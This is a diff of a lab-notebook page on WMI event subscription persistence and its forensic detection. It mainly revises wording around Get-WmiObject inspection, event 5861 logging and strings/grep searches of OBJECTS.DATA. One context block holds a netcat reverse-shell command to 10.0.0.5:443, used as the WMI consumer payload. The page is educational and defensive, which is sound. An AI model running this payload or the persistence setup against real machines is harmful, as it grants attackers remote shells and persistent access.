@@ -6,9 +6,9 @@ description: 'Persistence, Privilege Escalation'
 
 WMI events are made up of 3 key pieces:
 
-* event filters - conditions that the system will listen for \(i.e on new process created, on new disk added, etc\)
-* event consumers - consumers can carry out actions when event filters are triggered \(i.e run a program, log to a log file, execute a script, etc\)
-* filter to consumer bindings - the gluing matter that marries event filters and event consumers together in order for the event consumers.
+* event filters - conditions that the system will listen for \(i.e on new process created, on new disk added, etc.\)
+* event consumers - consumers can carry out actions when event filters are triggered \(i.e run a program, log to a log file, execute a script, etc.\)
+* filter to consumer bindings - the gluing matter that marries event filters and event consumers together in order for the event consumers to get invoked.
 
 WMI Events can be used by both offenders \(persistence, i.e launch payload when system is booted\) as well as defenders \(kill process evil.exe on its creation\).
 
@@ -58,7 +58,7 @@ Note that the `ExecutablePath` property of the `__EVENTCONSUMER` points to a rud
 
 {% code-tabs %}
 {% code-tabs-item title="c:\\shell.cmd" %}
-```text
+```csharp
 C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
 ```
 {% endcode-tabs-item %}
@@ -80,7 +80,7 @@ Get-WmiObject -Class __EventFilter -Namespace root\subscription
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-Note the `Query` property which suggests this wmi filter is checking system's uptime every 5 seconds and is checking if the system has been up for at least 1200 seconds:
+Note the `Query` property suggests this wmi filter is checking system's uptime every 5 seconds and is checking if the system has been up for at least 1200 seconds:
 
 ![](../../.gitbook/assets/wmi-filter.png)
 
@@ -106,17 +106,15 @@ Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\subscription
 
 ![](../../.gitbook/assets/wmi-binding.png)
 
-Microsoft-Windows-WMI-Activity/Operational contains logs for event `5861` that capture  event filter and event consumer creations on the victim system:
+Microsoft-Windows-WMI-Activity/Operational contains logs for event `5861` that capture event filter and event consumer creations on the victim system:
 
 ![](../../.gitbook/assets/wmi-filter-consumer-creation.png)
 
 ## Inspection
 
-If you suspect the host to be compromised and you want to inspect any `FilterToConsumer` bindings, you may not want to PSRemote to the machine since the attacker is already at least a local admin on that box since it is required to create bindings.
+If you suspect a host to be compromised and you want to inspect any `FilterToConsumer` bindings, you can do it with PSRemoting and the commands shown above or you can try getting the file`%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`
 
-Try getting the `%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`
-
-Then you can use [PyWMIPersistenceFinder.py](https://github.com/davidpany/WMI_Forensics) by David Pany to parse the `OBJECTS.DATA` file and get a list of bindings like so:
+Then you can use [PyWMIPersistenceFinder.py](https://github.com/davidpany/WMI_Forensics) by David Pany to parse the `OBJECTS.DATA` file and get a list of bindings like:
 
 ```bash
 ./PyWMIPersistenceFinder.py OBJECTS.DATA
@@ -126,23 +124,25 @@ Then you can use [PyWMIPersistenceFinder.py](https://github.com/davidpany/WMI_Fo
 
 ### Strings + Grep
 
-If you are limited to only the native \*nix utils you have to hand, you can get a pretty good insight into the bindings with the following command:
+If you are limited to only the native \*nix/cygwin utils you have to hand, you can get a pretty good insight into the bindings with the following command:
 
 ```csharp
 strings OBJECTS.DATA | grep -i filtertoconsumerbinding -A 3 --color
 ```
 
-Below are the results and we can easily see that one binding connects two evils - the evil consumer and the evil filter - see highlighted:
+Below are the results:
 
 ![](../../.gitbook/assets/wmi-strings-grep.png)
 
-Now that you know that you are dealing with `evil` filter and consumer, try  another rudimentary piped command:
+From the above graphic, we can easily see that one binding connects two evils - the evil consumer and the evil filter.
+
+Now that you know that you are dealing with `evil` filter and `evil` consumer, use another rudimentary piped command to look into the evil further:
 
 ```csharp
 strings OBJECTS.DATA | grep -i 'evil' -B3 -A2 --color
 ```
 
-Note how we can get a pretty decent glimpse into the malicious WMI persistence - note the `C:\shell.cmd`and `SELECT * FROM` ... - if you recall, this is what we put in our consumers and filters at the very [beginning](./#execution):
+Note how we can get a pretty decent glimpse into the malicious WMI persistence even with simple tools to hand - note the `C:\shell.cmd`and `SELECT * FROM` ... - if you recall, this is what we put in our consumers and filters at the very [beginning](./#execution) of the lab:
 
 ![](../../.gitbook/assets/wmi-strings-grep2.png)
 
